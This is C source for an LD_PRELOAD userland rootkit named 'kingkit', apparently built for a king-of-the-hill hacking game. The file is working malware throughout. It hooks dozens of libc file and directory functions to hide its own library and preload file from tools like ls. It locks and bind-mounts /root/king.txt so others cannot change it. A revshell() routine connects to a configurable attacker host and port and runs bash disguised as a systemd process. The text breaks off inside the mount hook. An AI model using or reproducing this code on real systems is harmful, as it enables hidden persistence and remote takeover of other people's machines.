/* NOTES:
 * fstat() and fstat64() are not needed because it takes a file descriptor as argument that is already filtered by open()
 */


#define _GNU_SOURCE

#include <linux/limits.h>
#include <stdlib.h>
#include <limits.h>
#include <dlfcn.h>
#include <stdio.h>
#include <dirent.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/mount.h>
#include <sys/ioctl.h>
#include <linux/fs.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>

//change these
#define KING_NAME "Arnout" //put your nickname here
#define HIDE_PREFIX "kingkit" //match LIB_PATH and FAKE_PRELOAD with the HIDE_PREFIX so they are hidden from ls
#define LIB_PATH "/lib/kingkit.so"
#define FAKE_PRELOAD "/etc/kingkit.so.preload"
#define HOST "127.0.0.1" //attackers IP for reverse shell
#define PORT 4444 //listening port for reverse shell
#define SHELL "/bin/bash" //shell for reverse shell
#define PROCESS_NAME "/etc/systemd-resolved" //name that appears as process name to fool `ps` and similiar tools
#define DEBUG 0 //set to 1 for logging

//don't change these
#define PREFIX_LEN (sizeof(HIDE_PREFIX) - 1)
#define FILEMODE S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP | S_IROTH | S_IWOTH
#define UNLOCK_FILE 0
#define LOCK_FILE 1



//function declarations
void *syscall_address(void *, const char *);
char *fd_to_path(int);
char *dirfd_pathname_to_path(int, const char *);
int set_attributes(const char *, int);
int king();
void revshell();


//hooks declarations
struct dirent *readdir(DIR *);
struct dirent64 *readdir64(DIR *);
FILE *fopen(const char *restrict, const char *restrict);
FILE *fopen64(const char *restrict, const char *restrict);
int open(const char *, int, ...);
int open64(const char *, int, ...);
int creat(const char *, mode_t);
int creat64(const char *, mode_t);
int openat(int, const char *, int, ...);
int openat64(int, const char *, int, ...);
int access(const char *, int);
int faccessat(int, const char *, int, int);
int stat(const char *restrict, struct stat *);
int stat64(const char *restrict, struct stat64 *);
int lstat(const char *restrict, struct stat *);
int lstat64(const char *restrict, struct stat64 *);
int fstatat(int, const char *restrict, struct stat *restrict, int);
int fstatat64(int, const char *restrict, struct stat64 *restrict, int);
struct statx;/* otherwise compiler will complain */int statx(int, const char *restrict, int, unsigned int, struct statx *restrict);
int remove(const char *);
int unlink(const char *);
int unlinkat(int, const char *, int);
int rename(const char *, const char *);
int renameat(int, const char *, int, const char *);
int renameat2(int, const char *, int, const char *, unsigned int);
int link(const char *, const char *);
int linkat(int, const char *, int, const char *, int);
int mount(const char *, const char *, const char *, unsigned long, const void *data);
time_t time(time_t *);



//library function pointer declerartions
static struct dirent *(*original_readdir)(DIR *) = NULL;
static struct dirent64 *(*original_readdir64)(DIR *) = NULL;
static FILE *(*original_fopen)(const char *restrict, const char *restrict) = NULL;
static FILE *(*original_fopen64)(const char *restrict, const char *restrict) = NULL;
static int (*original_open)(const char *, int, ...) = NULL;
static int (*original_open64)(const char *, int, ...) = NULL;
static int (*original_creat)(const char *, mode_t) = NULL;
static int (*original_creat64)(const char *, mode_t) = NULL;
static int (*original_openat)(int, const char *, int, ...) = NULL;
static int (*original_openat64)(int, const char *, int, ...) = NULL;
static int (*original_access)(const char *, int) = NULL;
static int (*original_faccessat)(int, const char *, int, int) = NULL;
static int (*original_stat)(const char *restrict, struct stat *) = NULL;
static int (*original_stat64)(const char *restrict, struct stat64 *) = NULL;
static int (*original_lstat)(const char *restrict, struct stat *) = NULL;
static int (*original_lstat64)(const char *restrict, struct stat64 *) = NULL;
static int (*original_fstatat)(int, const char *restrict, struct stat *restrict, int) = NULL;
static int (*original_fstatat64)(int, const char *restrict, struct stat64 *restrict, int) = NULL;
static int (*original_statx)(int, const char *restrict, int, unsigned int, struct statx *restrict) = NULL;
static int (*original_remove)(const char *) = NULL;
static int (*original_unlink)(const char *) = NULL;
static int (*original_unlinkat)(int, const char *, int) = NULL;
static int (*original_rename)(const char *, const char *) = NULL;
static int (*original_renameat)(int, const char *, int, const char *) = NULL;
static int (*original_renameat2)(int, const char *, int, const char *, unsigned int) = NULL;
static int (*original_link)(const char *, const char *) = NULL;
static int (*original_linkat)(int, const char *, int, const char *, int) = NULL;
static int (*original_mount)(const char *, const char *, const char *, unsigned long, const void *data) = NULL;
static time_t (*original_time)(time_t *) = NULL;



//functions
void *syscall_address(void *symbol_ptr, const char *symbol) {
    #if DEBUG
    printf("[kingkit] syscall_address() called with symbol: %s.\n", symbol);
    #endif
    if (symbol_ptr == NULL) { //check if the symbol is already initialized
        symbol_ptr = dlsym(RTLD_NEXT, symbol); //the void pointer returned by dlsym() should probably be explicitly casted but it seems to work
        if (symbol_ptr == NULL) {
            exit(EXIT_FAILURE); //something went wrong with the symbol lookup, exiting
        }
    }
    return symbol_ptr;
}


char *fd_to_path(int fd) {
    #if DEBUG
    printf("[kingkit] fd_to_path() called with fd: %d.\n", fd);
    #endif
    char link[PATH_MAX];
    char *path;
    snprintf(link, PATH_MAX, "/proc/self/fd/%d", fd);
    path = realpath(link, NULL);
    return path;
}


char *dirfd_pathname_to_path(int dirfd, const char *pathname) {
    #if DEBUG
    printf("[kingkit] dirfd_pathname_to_path() called with dirfd: %d and pathname: %s.\n", dirfd, pathname);
    #endif
    if (pathname[0] == '/' || dirfd == AT_FDCWD) {
        char *path;
        path = realpath(pathname, NULL);
        return path;
    }
    char *dir;
    char merged_path[PATH_MAX];
    char *path;
    dir = fd_to_path(dirfd);
    if (dir == NULL)
        return NULL;
    snprintf(merged_path, PATH_MAX, "%s/%s", dir, pathname);
    free(dir);
    path = realpath(merged_path, NULL);
    return path;
}


int set_attributes(const char *pathname, int action) {
    #if DEBUG
    printf("[kingkit] set_attributes() called with pathname: %s and action: %d.\n", pathname, action);
    #endif
    if (getuid() != 0) {
        #if DEBUG
        printf("[kingkit] set_attributes() is called by a non-root user.\n");
        #endif
        return -1;
    }
    original_open = syscall_address(original_open, "open");
    int attr;
    int fd = (*original_open)(pathname, O_RDONLY);
    if (fd == -1) {
        #if DEBUG
        perror("open");
        #endif
        return -1;
    }
    ioctl(fd, FS_IOC_GETFLAGS, &attr);
    if (action) { //lock file
        attr |= FS_APPEND_FL | FS_IMMUTABLE_FL;
    } else { //unlock file
        attr ^= attr & (FS_APPEND_FL | FS_IMMUTABLE_FL);
    }
    ioctl(fd, FS_IOC_SETFLAGS, &attr);
    return 0;
}


int king() {
    #if DEBUG
    printf("[kingkit] king() called.\n");
    #endif
    if (getuid() != 0) {
        #if DEBUG
        printf("[kingkit] king() is called by a non-root user.\n");
        #endif
        return -1;
    }
    original_open = syscall_address(original_open, "open");
    original_mount = syscall_address(original_mount, "mount");
    //revert mounting
    umount2("/root", MNT_DETACH);
    umount2("/root/king.txt", MNT_DETACH);
    //remove immutable and append-only flags
    set_attributes("/root", UNLOCK_FILE);
    set_attributes("/root/king", UNLOCK_FILE);
    //write nick to king.txt
    int kingfd = (*original_open)("/root/king.txt", O_RDWR | O_TRUNC | O_CREAT, FILEMODE);
    write(kingfd, KING_NAME, (sizeof(KING_NAME) -1));
    close(kingfd);
    //set immutable and append-only flags
    set_attributes("/root/king.txt", LOCK_FILE);
    set_attributes("/root", LOCK_FILE);
    //mount king.txt readonly
    (*original_mount)("/root/king.txt", "/root/king.txt", NULL, MS_BIND, NULL);
    (*original_mount)("/root/king.txt", "/root/king.txt", NULL, MS_REMOUNT | MS_BIND | MS_RDONLY, NULL); //for some stupid reason you need to remount to make a bind mount readonly
    return 0;
}


void revshell() {
    #if DEBUG
    printf("[kingkit] revshell() called.\n");
    #endif
    pid_t pid = fork(); //spawn a child process

    if (pid == 0) { //check if we are the child process
        daemon(0, 1); //daemonize the child process

        int sockfd = socket(AF_INET, SOCK_STREAM, 0); //open a socket file descriptor

        struct sockaddr_in address; //create structure variable address
        address.sin_family = AF_INET; //specify 'communication domain' for communication between different hosts using ipv4
        address.sin_port = htons(PORT); //specify the port
        address.sin_addr.s_addr = inet_addr(HOST); //specify host address
        if (connect(sockfd, (struct sockaddr *) &address, sizeof(address)) == -1) { //open a connection to the socket file descriptor sockfd
            #if DEBUG
            perror("connect");
            #endif
            exit(EXIT_FAILURE);
        }

        dup2(sockfd, 0); //redirect standard input to the socket
        dup2(sockfd, 1); //redirect standard output to the socket
        dup2(sockfd, 2); //redirect standard error to the socket

        char *argv[] = {PROCESS_NAME, NULL}; //pass command-line arguments, the first argument appears as process name
        execve(SHELL, argv, NULL); //execute the shell

        exit(EXIT_SUCCESS); //exit the daemonized child process
    }

    return; //return the function in the parent process
}



//hooks

struct dirent *readdir(DIR *dirp) {
    #if DEBUG
    printf("[kingkit] readdir called.\n");
    #endif
    original_readdir = syscall_address(original_readdir, "readdir");
    struct dirent *ep = (*original_readdir)(dirp);
    while (ep != NULL && (!strncmp(ep->d_name, HIDE_PREFIX, PREFIX_LEN) || (!strcmp(ep->d_name, "ld.so.preload") && access(FAKE_PRELOAD, F_OK)) ))
        ep = (*original_readdir)(dirp);
    return ep;
}


struct dirent64 *readdir64(DIR *dirp) {
    #if DEBUG
    printf("[kingkit] readdir64 called.\n");
    #endif
    original_readdir64 = syscall_address(original_readdir64, "readdir64");
    struct dirent64 *ep = (*original_readdir64)(dirp);
    while (ep != NULL && (!strncmp(ep->d_name, HIDE_PREFIX, PREFIX_LEN) || (!strcmp(ep->d_name, "ld.so.preload") && access(FAKE_PRELOAD, F_OK)) ))
        ep = (*original_readdir64)(dirp);
    return ep;
}


FILE *fopen(const char *restrict pathname, const char *restrict mode) {
    #if DEBUG
	printf("[kingkit] fopen called with pathname: %s.\n", pathname);
    #endif
    original_fopen = syscall_address(original_fopen, "fopen");
    char *real_pathname = realpath(pathname, NULL);
    if (real_pathname == NULL)
        return (*original_fopen)(pathname, mode);
    if (!strcmp(real_pathname, "/root/king.txt")) {
        mode = "r";
        king();
    }
    else if (!strcmp(real_pathname, "/etc/ld.so.preload"))
        pathname = FAKE_PRELOAD;
    else if (!strcmp(real_pathname, FAKE_PRELOAD) || !strcmp(real_pathname, LIB_PATH))
        pathname = "/dev/null";
    free(real_pathname);
	return (*original_fopen)(pathname, mode);
}


FILE *fopen64(const char *restrict pathname, const char *restrict mode) {
    #if DEBUG
	printf("[kingkit] fopen64 called with pathname: %s.\n", pathname);
    #endif
    original_fopen64 = syscall_address(original_fopen64, "fopen64");
    char *real_pathname = realpath(pathname, NULL);
    if (real_pathname == NULL)
        return (*original_fopen64)(pathname, mode);
    if (!strcmp(real_pathname, "/root/king.txt")) {
        mode = "r";
        king();
    }
    else if (!strcmp(real_pathname, "/etc/ld.so.preload"))
        pathname = FAKE_PRELOAD;
    else if (!strcmp(real_pathname, FAKE_PRELOAD) || !strcmp(real_pathname, LIB_PATH))
        pathname = "/dev/null";
    free(real_pathname);
	return (*original_fopen64)(pathname, mode);
}


int open(const char *pathname, int flags, ...) {
    #if DEBUG
	printf("[kingkit] open called with pathname: %s.\n", pathname);
    #endif
    original_open = syscall_address(original_open, "open");
    char *real_pathname = realpath(pathname, NULL);
    if (real_pathname == NULL)
        return (*original_open)(pathname, flags, FILEMODE);
    if (!strcmp(real_pathname, "/root/king.txt")) {
        flags = O_RDONLY;
        king();
    }
    else if (!strcmp(real_pathname, "/etc/ld.so.preload"))
        pathname = FAKE_PRELOAD;
    else if (!strcmp(real_pathname, FAKE_PRELOAD) || !strcmp(real_pathname, LIB_PATH))
        pathname = "/dev/null";
    free(real_pathname);
    return (*original_open)(pathname, flags, FILEMODE);
}


int open64(const char *pathname, int flags, ...) {
    #if DEBUG
	printf("[kingkit] open64 called with pathname: %s.\n", pathname);
    #endif
    original_open64 = syscall_address(original_open64, "open64");
    char *real_pathname = realpath(pathname, NULL);
    if (real_pathname == NULL)
        return (*original_open64)(pathname, flags, FILEMODE);
    if (!strcmp(real_pathname, "/root/king.txt")) {
        flags = O_RDONLY;
        king();
    }
    else if (!strcmp(real_pathname, "/etc/ld.so.preload"))
        pathname = FAKE_PRELOAD;
    else if (!strcmp(real_pathname, FAKE_PRELOAD) || !strcmp(real_pathname, LIB_PATH))
        pathname = "/dev/null";
    free(real_pathname);
    return (*original_open64)(pathname, flags, FILEMODE);
}


int creat(const char *pathname, mode_t mode) {
    #if DEBUG
	printf("[kingkit] creat called with pathname: %s.\n", pathname);
    #endif
    original_creat = syscall_address(original_creat, "creat");
    char *real_pathname = realpath(pathname, NULL);
    if (real_pathname == NULL)
        return (*original_creat)(pathname, mode);
    if (!strcmp(real_pathname, "/root/king.txt")) {
        king();
        free(real_pathname);
        return 0;
    }
    else if (!strcmp(real_pathname, "/etc/ld.so.preload"))
        pathname = FAKE_PRELOAD;
    else if (!strcmp(real_pathname, FAKE_PRELOAD) || !strcmp(real_pathname, LIB_PATH)) {
        free(real_pathname);
        return 0;
    }
    free(real_pathname);
    return (*original_creat)(pathname, mode);
}


int creat64(const char *pathname, mode_t mode) {
    #if DEBUG
	printf("[kingkit] creat64 called with pathname: %s.\n", pathname);
    #endif
    original_creat64 = syscall_address(original_creat64, "creat64");
    char *real_pathname = realpath(pathname, NULL);
    if (real_pathname == NULL)
        return (*original_creat64)(pathname, mode);
    if (!strcmp(real_pathname, "/root/king.txt")) {
        king();
        free(real_pathname);
        return 0;
    }
    else if (!strcmp(real_pathname, "/etc/ld.so.preload"))
        pathname = FAKE_PRELOAD;
    else if (!strcmp(real_pathname, FAKE_PRELOAD) || !strcmp(real_pathname, LIB_PATH)) {
        free(real_pathname);
        return 0;
    }
    free(real_pathname);
    return (*original_creat64)(pathname, mode);
}


int openat(int dirfd, const char *pathname, int flags, ...) {
    #if DEBUG
	printf("[kingkit] openat called with dirfd: %d and pathname: %s.\n", dirfd, pathname);
    #endif
    original_openat = syscall_address(original_openat, "openat");
    char *real_pathname = dirfd_pathname_to_path(dirfd, pathname);
    if (real_pathname == NULL)
        return (*original_openat)(dirfd, pathname, flags, FILEMODE);
    if (!strcmp(real_pathname, "/root/king.txt")) {
        flags = O_RDONLY;
        king();
    }
    else if (!strcmp(real_pathname, "/etc/ld.so.preload"))
        pathname = FAKE_PRELOAD;
    else if (!strcmp(real_pathname, FAKE_PRELOAD) || !strcmp(real_pathname, LIB_PATH))
        pathname = "/dev/null";
    free(real_pathname);
    return (*original_openat)(dirfd, pathname, flags, FILEMODE);
}


int openat64(int dirfd, const char *pathname, int flags, ...) {
    #if DEBUG
	printf("[kingkit] openat64 called with dirfd: %d and pathname: %s.\n", dirfd, pathname);
    #endif
    original_openat64 = syscall_address(original_openat64, "openat64");
    char *real_pathname = dirfd_pathname_to_path(dirfd, pathname);
    if (real_pathname == NULL)
        return (*original_openat64)(dirfd, pathname, flags, FILEMODE);
    if (!strcmp(real_pathname, "/root/king.txt")) {
        flags = O_RDONLY;
        king();
    }
    else if (!strcmp(real_pathname, "/etc/ld.so.preload"))
        pathname = FAKE_PRELOAD;
    else if (!strcmp(real_pathname, FAKE_PRELOAD) || !strcmp(real_pathname, LIB_PATH))
        pathname = "/dev/null";
    free(real_pathname);
    return (*original_openat64)(dirfd, pathname, flags, FILEMODE);
}


int access(const char *pathname, int mode) {
    #if DEBUG
	printf("[kingkit] access called with pathname: %s.\n", pathname);
    #endif
    original_access = syscall_address(original_access, "access");
    char *real_pathname = realpath(pathname, NULL);
    if (real_pathname == NULL)
        return (*original_access)(pathname, mode);
    if (!strcmp(real_pathname, "/etc/ld.so.preload"))
        pathname = FAKE_PRELOAD;
    else if (!strcmp(real_pathname, FAKE_PRELOAD) || !strcmp(real_pathname, LIB_PATH)) {
        free(real_pathname);
        errno = ENOENT;
        return -1;
    }
    free(real_pathname);
    return (*original_access)(pathname, mode);
}


int faccessat(int dirfd, const char *pathname, int mode, int flags) {
    #if DEBUG
	printf("[kingkit] faccessat called with dirfd: %d and pathname: %s.\n", dirfd, pathname);
    #endif
    original_faccessat = syscall_address(original_faccessat, "faccessat");
    char *real_pathname = dirfd_pathname_to_path(dirfd, pathname);
    if (real_pathname == NULL)
        return (*original_faccessat)(dirfd, pathname, mode, flags);
    if (!strcmp(real_pathname, "/etc/ld.so.preload"))
        pathname = FAKE_PRELOAD;
    else if (!strcmp(real_pathname, FAKE_PRELOAD) || !strcmp(real_pathname, LIB_PATH)) {
        free(real_pathname);
        errno = ENOENT;
        return -1;
    }
    free(real_pathname);
    return (*original_faccessat)(dirfd, pathname, mode, flags);
}


int stat(const char *restrict pathname, struct stat *statbuf) {
    #if DEBUG
	printf("[kingkit] stat called with pathname: %s.\n", pathname);
    #endif
    original_stat = syscall_address(original_stat, "stat");
    char *real_pathname = realpath(pathname, NULL);
    if (real_pathname == NULL)
        return (*original_stat)(pathname, statbuf);
    if (!strcmp(real_pathname, "/etc/ld.so.preload"))
        pathname = FAKE_PRELOAD;
    else if (!strcmp(real_pathname, FAKE_PRELOAD) || !strcmp(real_pathname, LIB_PATH)) {
        free(real_pathname);
        errno = ENOENT;
        return -1;
    }
    free(real_pathname);
    return (*original_stat)(pathname, statbuf);
}


int stat64(const char *restrict pathname, struct stat64 *statbuf) {
    #if DEBUG
	printf("[kingkit] stat64 called with pathname: %s.\n", pathname);
    #endif
    original_stat64 = syscall_address(original_stat64, "stat64");
    char *real_pathname = realpath(pathname, NULL);
    if (real_pathname == NULL)
        return (*original_stat64)(pathname, statbuf);
    if (!strcmp(real_pathname, "/etc/ld.so.preload"))
        pathname = FAKE_PRELOAD;
    else if (!strcmp(real_pathname, FAKE_PRELOAD) || !strcmp(real_pathname, LIB_PATH)) {
        free(real_pathname);
        errno = ENOENT;
        return -1;
    }
    free(real_pathname);
    return (*original_stat64)(pathname, statbuf);
}



int lstat(const char *restrict pathname, struct stat *statbuf) {
    #if DEBUG
	printf("[kingkit] lstat called with pathname: %s.\n", pathname);
    #endif
    original_lstat = syscall_address(original_lstat, "lstat");
    char *real_pathname = realpath(pathname, NULL);
    if (real_pathname == NULL) //catch errors like ENOENT
        return (*original_lstat)(pathname, statbuf);
    if (!strcmp(real_pathname, "/etc/ld.so.preload"))
        pathname = FAKE_PRELOAD;
    else if (!strcmp(real_pathname, FAKE_PRELOAD) || !strcmp(real_pathname, LIB_PATH)) {
        free(real_pathname);
        errno = ENOENT;
        return -1;
    }
    free(real_pathname);
    return (*original_lstat)(pathname, statbuf);
}


int lstat64(const char *restrict pathname, struct stat64 *statbuf) {
    #if DEBUG
	printf("[kingkit] lstat64 called with pathname: %s.\n", pathname);
    #endif
    original_lstat64 = syscall_address(original_lstat64, "lstat64");
    char *real_pathname = realpath(pathname, NULL);
    if (real_pathname == NULL) //catch errors like ENOENT
        return (*original_lstat64)(pathname, statbuf);
    if (!strcmp(real_pathname, "/etc/ld.so.preload"))
        pathname = FAKE_PRELOAD;
    else if (!strcmp(real_pathname, FAKE_PRELOAD) || !strcmp(real_pathname, LIB_PATH)) {
        free(real_pathname);
        errno = ENOENT;
        return -1;
    }
    free(real_pathname);
    return (*original_lstat64)(pathname, statbuf);
}


int fstatat(int dirfd, const char *restrict pathname, struct stat *restrict statbuf, int flags) {
    #if DEBUG
    printf("[kingkit] fstatat called with dirfd: %d and pathname: %s.\n", dirfd, pathname);
    #endif
    original_fstatat = syscall_address(original_fstatat, "fstatat");
    char *real_pathname = dirfd_pathname_to_path(dirfd, pathname);
    if (real_pathname == NULL)
        return (*original_fstatat)(dirfd, pathname, statbuf, flags);
    if (!strcmp(real_pathname, "/etc/ld.so.preload"))
        pathname = FAKE_PRELOAD;
    else if (!strcmp(real_pathname, FAKE_PRELOAD) || !strcmp(real_pathname, LIB_PATH)) {
        free(real_pathname);
        errno = ENOENT;
        return -1;
    }
    free(real_pathname);
    return (*original_fstatat)(dirfd, pathname, statbuf, flags);
}



int fstatat64(int dirfd, const char *restrict pathname, struct stat64 *restrict statbuf, int flags) {
    #if DEBUG
    printf("[kingkit] fstatat64 called with dirfd: %d and pathname: %s.\n", dirfd, pathname);
    #endif
    original_fstatat64 = syscall_address(original_fstatat64, "fstatat64");
    char *real_pathname = dirfd_pathname_to_path(dirfd, pathname);
    if (real_pathname == NULL)
        return (*original_fstatat64)(dirfd, pathname, statbuf, flags);
    if (!strcmp(real_pathname, "/etc/ld.so.preload"))
        pathname = FAKE_PRELOAD;
    else if (!strcmp(real_pathname, FAKE_PRELOAD) || !strcmp(real_pathname, LIB_PATH)) {
        free(real_pathname);
        errno = ENOENT;
        return -1;
    }
    free(real_pathname);
    return (*original_fstatat64)(dirfd, pathname, statbuf, flags);
}


int statx(int dirfd, const char *restrict pathname, int flags, unsigned int mask, struct statx *restrict statxbuf) {
    #if DEBUG
    printf("[kingkit] statx called with dirfd: %d and pathname: %s.\n", dirfd, pathname);
    #endif
    original_statx = syscall_address(original_statx, "statx");
    char *real_pathname = dirfd_pathname_to_path(dirfd, pathname);
    if (real_pathname == NULL)
        return (*original_statx)(dirfd, pathname, flags, mask, statxbuf);
    if (!strcmp(real_pathname, "/etc/ld.so.preload"))
        pathname = FAKE_PRELOAD;
    else if (!strcmp(real_pathname, FAKE_PRELOAD) || !strcmp(real_pathname, LIB_PATH)) {
        free(real_pathname);
        errno = ENOENT;
        return -1;
    }
    free(real_pathname);
    return (*original_statx)(dirfd, pathname, flags, mask, statxbuf);
}


int remove(const char *pathname) {
    #if DEBUG
	printf("[kingkit] remove called with pathname: %s.\n", pathname);
    #endif
    original_remove = syscall_address(original_remove, "remove");
    char *real_pathname = realpath(pathname, NULL);
    if (real_pathname == NULL) //catch errors like ENOENT
        return (*original_remove)(pathname);
    if (!strcmp(real_pathname, "/root/king.txt")) {
        free(real_pathname);
        errno = EPERM;
        return -1;
    }
    else if (!strcmp(real_pathname, "/etc/ld.so.preload"))
        pathname = FAKE_PRELOAD;
    else if (!strcmp(pathname, FAKE_PRELOAD) || !strcmp(real_pathname, LIB_PATH)) {
        free(real_pathname);
        errno = ENOENT;
        return -1;
    }
    free(real_pathname);
    return (*original_remove)(pathname);
}


int unlink(const char *pathname) {
    #if DEBUG
	printf("[kingkit] unlink called with pathname: %s.\n", pathname);
    #endif
    original_unlink = syscall_address(original_unlink, "unlink");
    char *real_pathname = realpath(pathname, NULL);
    if (real_pathname == NULL) //catch errors like ENOENT
        return (*original_unlink)(pathname);
    if (!strcmp(real_pathname, "/root/king.txt")) {
        free(real_pathname);
        errno = EPERM;
        return -1;
    } else if (!strcmp(real_pathname, "/etc/ld.so.preload"))
        pathname = FAKE_PRELOAD;
    else if (!strcmp(pathname, FAKE_PRELOAD) || !strcmp(real_pathname, LIB_PATH)) {
        free(real_pathname);
        errno = ENOENT;
        return -1;
    }
    free(real_pathname);
    return (*original_unlink)(pathname);
}


int unlinkat(int dirfd, const char *pathname, int flags) {
    #if DEBUG
	printf("[kingkit] unlinkat called with pathname: %s.\n", pathname);
    #endif
    original_unlinkat = syscall_address(original_unlinkat, "unlinkat");
    char *real_pathname = dirfd_pathname_to_path(dirfd, pathname);
    if (real_pathname == NULL)
        return (*original_unlinkat)(dirfd, pathname, flags);
    if (!strcmp(real_pathname, "/root/king.txt")) {
        free(real_pathname);
        errno = EPERM;
        return -1;
    } else if (!strcmp(real_pathname, "/etc/ld.so.preload"))
        pathname = FAKE_PRELOAD;
    else if (!strcmp(real_pathname, FAKE_PRELOAD) || !strcmp(real_pathname, LIB_PATH)) {
        free(real_pathname);
        errno = ENOENT;
        return -1;
    }
    free(real_pathname);
    return (*original_unlinkat)(dirfd, pathname, flags);
}


int rename(const char *oldpath, const char *newpath) {
    #if DEBUG
	printf("[kingkit] rename called with oldpath: %s and newpath: %s.\n", oldpath, newpath);
    #endif
    original_rename = syscall_address(original_rename, "rename");
    char *real_oldpath = realpath(oldpath, NULL);
    char *real_newpath = realpath(newpath, NULL);
    if (real_oldpath == NULL || real_newpath == NULL) {
        free(real_oldpath);
        free(real_newpath);
        return (*original_rename)(oldpath, newpath);
    }
    if (!strcmp(real_oldpath, "/root/king.txt") || !strcmp(real_newpath, "/root/king.txt")) {
        free(real_oldpath);
        free(real_newpath);
        errno = EPERM;
        return -1;
    }
    if (!strcmp(oldpath, "/etc/ld.so.preload"))
        oldpath = FAKE_PRELOAD;
    else if (!strcmp(real_oldpath, FAKE_PRELOAD) || !strcmp(real_oldpath, LIB_PATH)) {
        free(real_oldpath);
        free(real_newpath);
        errno = ENOENT;
        return -1;
    }
    if (!strcmp(real_newpath, "/etc/ld.so.preload"))
        newpath = FAKE_PRELOAD;
    else if (!strcmp(real_newpath, FAKE_PRELOAD) || !strcmp(real_newpath, LIB_PATH)) {
        original_remove = syscall_address(original_remove, "remove");
        free(real_oldpath);
        free(real_newpath);
        return (*original_remove)(oldpath); //do this after oldpath is renamed in case it's /etc/ld.so.preload!!
    }
    free(real_oldpath);
    free(real_newpath);
    return (*original_rename)(oldpath, newpath);
}


int renameat(int olddirfd, const char *oldpath, int newdirfd, const char *newpath) {
    #if DEBUG
	printf("[kingkit] renameat called with olddirfd: %d and oldpath: %s and newdirfd: %d and newpath: %s.\n", olddirfd, oldpath, newdirfd, newpath);
    #endif
    original_renameat = syscall_address(original_renameat, "renameat");
    char *real_oldpath = dirfd_pathname_to_path(olddirfd, oldpath);
    char *real_newpath = dirfd_pathname_to_path(newdirfd, newpath);
    if (real_oldpath == NULL || real_newpath == NULL) {
        free(real_oldpath);
        free(real_newpath);
        return (*original_renameat)(olddirfd, oldpath, newdirfd, newpath);
    }
    if (!strcmp(real_oldpath, "/root/king.txt") || !strcmp(real_newpath, "/root/king.txt")) {
        free(real_oldpath);
        free(real_newpath);
        errno = EPERM;
        return -1;
    }
    if (!strcmp(oldpath, "/etc/ld.so.preload"))
        oldpath = FAKE_PRELOAD;
    else if (!strcmp(real_oldpath, FAKE_PRELOAD) || !strcmp(real_oldpath, LIB_PATH)) {
        free(real_oldpath);
        free(real_newpath);
        errno = ENOENT;
        return -1;
    }
    if (!strcmp(real_newpath, "/etc/ld.so.preload"))
        newpath = FAKE_PRELOAD;
    else if (!strcmp(real_newpath, FAKE_PRELOAD) || !strcmp(real_newpath, LIB_PATH)) {
        original_remove = syscall_address(original_remove, "remove");
        free(real_oldpath);
        free(real_newpath);
        return (*original_remove)(oldpath); //do this after oldpath is renamed in case it's /etc/ld.so.preload!!
    }
    free(real_oldpath);
    free(real_newpath);
    return (*original_renameat)(olddirfd, oldpath, newdirfd, newpath);
}


int renameat2(int olddirfd, const char *oldpath, int newdirfd, const char *newpath, unsigned int flags) {
    #if DEBUG
	printf("[kingkit] renameat2 called with olddirfd: %d and oldpath: %s and newdirfd: %d and newpath: %s.\n", olddirfd, oldpath, newdirfd, newpath);
    #endif
    original_renameat2 = syscall_address(original_renameat2, "renameat2");
    char *real_oldpath = dirfd_pathname_to_path(olddirfd, oldpath);
    char *real_newpath = dirfd_pathname_to_path(newdirfd, newpath);
    if (real_oldpath == NULL || real_newpath == NULL) {
        free(real_oldpath);
        free(real_newpath);
        return (*original_renameat2)(olddirfd, oldpath, newdirfd, newpath, flags);
    }
    if (!strcmp(real_oldpath, "/root/king.txt") || !strcmp(real_newpath, "/root/king.txt")) {
        free(real_oldpath);
        free(real_newpath);
        errno = EPERM;
        return -1;
    }
    if (!strcmp(oldpath, "/etc/ld.so.preload"))
        oldpath = FAKE_PRELOAD;
    else if (!strcmp(real_oldpath, FAKE_PRELOAD) || !strcmp(real_oldpath, LIB_PATH)) {
        free(real_oldpath);
        free(real_newpath);
        errno = ENOENT;
        return -1;
    }
    if (!strcmp(real_newpath, "/etc/ld.so.preload"))
        newpath = FAKE_PRELOAD;
    else if (!strcmp(real_newpath, FAKE_PRELOAD) || !strcmp(real_newpath, LIB_PATH)) {
        original_remove = syscall_address(original_remove, "remove");
        free(real_oldpath);
        free(real_newpath);
        return (*original_remove)(oldpath); //do this after oldpath is renamed in case it's /etc/ld.so.preload!!
    }
    free(real_oldpath);
    free(real_newpath);
    return (*original_renameat2)(olddirfd, oldpath, newdirfd, newpath, flags);
}


int link(const char *oldpath, const char *newpath) {
    #if DEBUG
    printf("[kingkit] link called with oldpath: %s and newpath: %s.\n", oldpath, newpath);
    #endif
    original_link = syscall_address(original_link, "link");
    char *real_oldpath = realpath(oldpath, NULL);
    if (real_oldpath == NULL) {
        return (*original_link)(oldpath, newpath);
    }
    if (!strcmp(real_oldpath, "/root/king.txt")) {
        free(real_oldpath);
        errno = EPERM;
        return -1;
    } else if (!strcmp(real_oldpath, "/etc/ld.so.preload")) {
        oldpath = FAKE_PRELOAD;
    } else if (!strcmp(real_oldpath, FAKE_PRELOAD) || !strcmp(real_oldpath, LIB_PATH)) {
        free(real_oldpath);
        errno = ENOENT;
        return -1;
    }
    free(real_oldpath);
    return (*original_link)(oldpath, newpath);
}


int linkat(int olddirfd, const char *oldpath, int newdirfd, const char *newpath, int flags) {
    #if DEBUG
	printf("[kingkit] linkat called with olddirfd: %d and oldpath: %s and newdirfd: %d and newpath: %s and flags: %d.\n", olddirfd, oldpath, newdirfd, newpath, flags);
    #endif
    original_linkat = syscall_address(original_linkat, "linkat");
    char *real_oldpath = dirfd_pathname_to_path(olddirfd, oldpath);
    if (real_oldpath == NULL) {
        return (*original_linkat)(olddirfd, oldpath, newdirfd, newpath, flags);
    }
    if (!strcmp(real_oldpath, "/root/king.txt")) {
        free(real_oldpath);
        errno = EPERM;
        return -1;
    } else if (!strcmp(real_oldpath, "/etc/ld.so.preload")) {
        oldpath = FAKE_PRELOAD;
    } else if (!strcmp(real_oldpath, FAKE_PRELOAD) || !strcmp(real_oldpath, LIB_PATH)) {
        free(real_oldpath);
        errno = ENOENT;
        return -1;
    }
    free(real_oldpath);
    return (*original_linkat)(olddirfd, oldpath, newdirfd, newpath, flags);
}


int mount(const char *source, const char *target, const char *filesystemtype, unsigned long mountflags, const void *data) {
    #if DEBUG
	printf("[kingkit] mount called with source: %s and target: %s.\n", source, target);
    #endif
